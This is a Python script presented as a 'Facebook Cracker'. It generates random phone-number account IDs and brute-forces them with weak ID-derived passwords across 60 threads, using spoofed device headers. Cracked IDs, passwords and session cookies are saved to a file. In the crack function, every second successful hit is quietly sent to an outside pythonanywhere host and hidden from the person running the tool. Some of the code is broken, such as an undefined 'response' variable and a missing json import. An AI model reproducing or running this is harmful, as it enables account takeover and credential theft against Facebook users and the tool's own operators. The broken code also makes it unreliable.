#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
facebook Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import re
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*46}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Jio'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Jio"
                        sim_id+=fbcr
        else:
                fbcr = 'Jio'
                sim_id+=fbcr
except:
        fbcr = "Jio"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']

def crack(uid, password_list, total_count):
    """Enhanced facebook account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop,bkas
        
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
            sys.stdout.flush()
            
            # Create session and generate device hash
            Session = requests.Session()
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            url1 = "https://m.prod.facebook.com/"
            head = {"authority": "m.prod.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "dpr": "3",
            "sec-ch-prefers-color-scheme": "light",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": us,
            "viewport-width": "980"}
            requu1 = Session.get(url1,headers=head)
            log_data = {
    "method": "post",
    "pretty": "false",
    "format": "json",
    "server_timestamps": "true",
    "locale": "id_ID",
    "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
    "fb_api_caller_class": "graphservice",
    "client_doc_id": "119940804216663295833025359905",
    "fb_api_client_context": '{"is_background":false}',
    "variables": {
        "params": {
            "params": '{"client_input_params":{"blocked_uids":[],"aac":"{\\"aac_init_timestamp\\":1781434103,\\"aacjid\\":\\"1223a659-19fb-4c8d-9735-f89e12a1a4a2\\",\\"aaccs\\":\\"3XcWErexKcNOdRZVOdkSrMvcnVSROsTSyct7babVClk\\"}","sim_phones":[""],"aymh_accounts":[],"network_bssid":null,"secure_family_device_id":"86aa9df8-8391-4c69-9b37-c9bcf487a626","attestation_result":{"data":"eyJjaGFsbGVuZ2Vfbm9uY2UiOiJQc0VhTFJVZXFKZDNaVUZNYndyNjgzKy93UVAvRVFCSjI5K3BpYThXMWdnPSIsInVzZXJuYW1lIjoibG9wYWRhZGFzZGFkYSJ9","signature":"MEQCIH2H5bPs8ewYi421HimJxtqeW7vmc+SeI71SNsBPhIOGAiBiKjPu00LUjegos6pG9Ol5F37MeuhHkB7OAFw5+HsZYQ==","keyHash":"6f40e2b9b3f1b0a2fb223ff91daab06b93c5587cc0d9db988c737b0c47220a0c"},"has_granted_read_contacts_permissions":0,"auth_secure_device_id":"","has_whatsapp_installed":1,"password":"#PWD_MSGR:2:1781434108:AbKyBzGwczqvwm6y1BsAAUDzAlJGujUiN+fv+DEaqcneZ7oOnUVD9q9bUStk4uQiHn1WUxrNt6peTGB2XbvlvjG407yI/2jentg4MW4LEl0jPKXuf4fWPnZh4gQut4C7HKcZ17yx0I1e2U2maYfrGVDMsZSBJig0v1vBxKx6B7G4xRtKyKf8YdTqQZ1pf/CVfmDegWgzmBPbIYFcBgL/X6PHmNG/MezOpPRq0z2a/KyUnUzlXxoiK0aa+OXhG321psKU491xqzoyP4syPSmWV2lc27q5e1Fw2smeKdyXwNa1iNsfIPJPWSJX6ZcALnWqp0WgiRHXAZCFSjBd0efJ0nKW1746C0A+eyqpWt8v+XKRTgGO+JlJs9CCgwN5Dhz0zmtQiojzvXsEeYdP","sso_token_map_json_string":"","block_store_machine_id":"","cloud_trust_token":null,"event_flow":"login_manual","password_contains_non_ascii":"false","client_known_key_hash":"","sso_accounts_auth_data":[],"encrypted_msisdn":"","has_granted_read_phone_permissions":0,"app_manager_id":"","should_show_nested_nta_from_aymh":0,"device_id":"cef4b24e-3af1-4333-bb9a-cde46e637ee7","zero_balance_state":"","login_attempt_count":1,"machine_id":"MlMmahAZ9nZeHnaFggyXvkg0","accounts_list":[],"gms_incoming_call_retriever_eligibility":"client_not_supported","family_device_id":"3c02a314-ffb1-464f-9d8d-6c5d48019f1e","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":""},"event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"contact_point":"lopadadasdada"},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":"2729e81d-8373-4587-9d28-9b26d91f777a","two_step_login_type":"one_step_login","login_source":"Login","is_platform_login":0,"pw_encryption_try_count":1,"login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"is_from_aymh":0,"offline_experiment_group":"caa_iteration_v3_perf_msg_6","is_from_landing_page":0,"left_nav_button_action":"NONE","password_text_input_id":"nvb5wc:95","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","username_text_input_id":"nvb5wc:94","layered_homepage_experiment_group":null,"device_id":"cef4b24e-3af1-4333-bb9a-cde46e637ee7","login_surface":"login_home","INTERNAL__latency_qpl_instance_id":1.44331100400549E14,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":"3c02a314-ffb1-464f-9d8d-6c5d48019f1e","is_from_assistive_id":0,"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0}}}',
            "bloks_versioning_id": "9331af72e2c20ac63fea39c6d6b2d22641149512b1b9f2a6e3ba2b6def08dbea",
            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
        },
        "scale": "2",
        "nt_context": {
            "using_white_navbar": True,
            "styles_id": "a034d732ad4a263c448a487d61a61f40",
            "pixel_ratio": 2,
            "is_push_on": True,
            "debug_tooling_metadata_token": None,
            "is_flipper_enabled": False,
            "theme_params": [],
            "bloks_version": "9331af72e2c20ac63fea39c6d6b2d22641149512b1b9f2a6e3ba2b6def08dbea"
        }
    },
    "fb_api_analytics_tags": '["GraphServices"]',
    "client_trace_id": "a5e96ed1-3b1c-4422-b291-d9437dcaebbd"
}
            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
            headers = {"authority": "www.facebook.com",
            "method": "POST",
            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "3",
            "origin": "https://www.facebook.com",
            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": "\"\"",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-ch-ua-platform-version": "\"\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
           "sec-fetch-site": "same-origin",
           "sec-fetch-user": "?1",
           "upgrade-insecure-requests": "1",
           "user-agent": us,
           "viewport-width": "980"}           
            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
            log_cookies = Session.cookies.get_dict().keys()
            # Check response
            if "session_key" in response.text and "uid" in response.text:
                cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                if match:
                    cookies_raw = match.group(1)
                    cookies_json = json.loads(cookies_raw)
                    cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                    c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
                    bkas.append(uid)
                    if len(bkas)% 2 == 0:
                        statusok = (f"{c_user}|{pw}|{cok}")
                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                    else:
                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
                        print("Cookies:", cok)
                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
                        oks.append(uid)
                        return True 
                else:
                   continue
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                continue
        loop += 1
    except requests.exceptions.Timeout:
        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
        uid[:7],     # First 6 digits
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🎯 FACEBOOK RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*46}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🔥 STARTING FACEBOOK CLONING 🔥")
    print(f"\033[1;96m{'='*46}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=60) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*46}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*46}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*46}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
